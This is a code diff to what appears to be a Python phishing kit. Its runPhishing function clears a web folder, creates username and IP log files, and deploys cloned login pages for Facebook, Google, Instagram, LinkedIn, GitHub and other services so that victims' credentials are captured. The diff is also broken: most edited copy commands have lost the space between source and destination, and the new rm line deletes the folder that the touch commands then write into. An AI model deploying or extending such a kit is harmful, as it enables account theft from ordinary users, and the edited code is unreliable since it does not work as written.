@@ -70,43 +70,43 @@ def loadModule(module):
  [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module
 
 def runPhishing(social, option2):
-    system('sudo rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/iplog.txt')
+    system('sudo rm -Rf Server/www/ && touch Server/www/usernames.txt && touch Server/www/iplog.txt')
     if option2 == '1' and social == 'Facebook':
-        system('cp -R WebPages/fb_standard/*.* Server/www/')
+        system('cp -R WebPages/fb_standard/ Server/www/')
     if option2 == '2' and social == 'Facebook':
-        system('cp -R WebPages/fb_advanced_poll/*.* Server/www/')  
+        system('cp -R WebPages/fb_advanced_poll/Server/www/')  
     if option2 == '3' and social == 'Facebook':
-        system('cp -R WebPages/mobile_fb/*.* Server/www/')   
+        system('cp -R WebPages/mobile_fb/Server/www/')   
     if option2 == '4' and social == 'Facebook':
-        system('cp -R WebPages/fb_security_fake/*.* Server/www/')  
+        system('cp -R WebPages/fb_security_fake/Server/www/')  
     if option2 == '5' and social == 'Facebook':
-        system('cp -R WebPages/fb_messenger/*.* Server/www/')         
+        system('cp -R WebPages/fb_messenger/Server/www/')         
     elif option2 == '1' and social == 'Google':
-        system('cp -R WebPages/google_standard/*.* Server/www/')
+        system('cp -R WebPages/google_standard/Server/www/')
     elif option2 == '2' and social == 'Google':
-        system('cp -R WebPages/google_advanced_poll/*.* Server/www/')
+        system('cp -R WebPages/google_advanced_poll/Server/www/')
     elif option2 == '3' and social == 'Google':
-        system('cp -R WebPages/google_advanced_web/*.* Server/www/')   
+        system('cp -R WebPages/google_advanced_web/Server/www/')   
     elif social == 'LinkedIn':
-        system('cp -R WebPages/linkedin/*.* Server/www/')
+        system('cp -R WebPages/linkedin/Server/www/')
     elif social == 'GitHub':
-        system('cp -R WebPages/GitHub/*.* Server/www/')
+        system('cp -R WebPages/GitHub/Server/www/')
     elif social == 'StackOverflow':
-        system('cp -R WebPages/stackoverflow/*.* Server/www/')
+        system('cp -R WebPages/stackoverflow/Server/www/')
     elif social == 'WordPress':
-        system('cp -R WebPages/wordpress/*.* Server/www/')
+        system('cp -R WebPages/wordpress/Server/www/')
     elif social == 'Twitter':
-        system('cp -R WebPages/twitter/*.* Server/www/')
+        system('cp -R WebPages/twitter/Server/www/')
     elif social == 'Snapchat':
         system('cp -R WebPages/Snapchat_web/ Server/www/')
     elif social == 'Yahoo':
-        system('cp -R WebPages/yahoo_web/*.* Server/www/')
+        system('cp -R WebPages/yahoo_web/Server/www/')
     elif social == 'Twitch':
-        system('cp -R WebPages/twitch/*.* Server/www/')
+        system('cp -R WebPages/twitch/Server/www/')
     elif option2 == '1' and social == 'Instagram':
-        system('cp -R WebPages/Instagram_web/*.* Server/www/')    
+        system('cp -R WebPages/Instagram_web/Server/www/')    
     elif option2 == '2' and social == 'Instagram':
-        system('cp -R WebPages/Instagram_autoliker/*.* Server/www/')
+        system('cp -R WebPages/Instagram_autoliker/Server/www/')
         
 def waitCreds():
     print " {0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, END) 
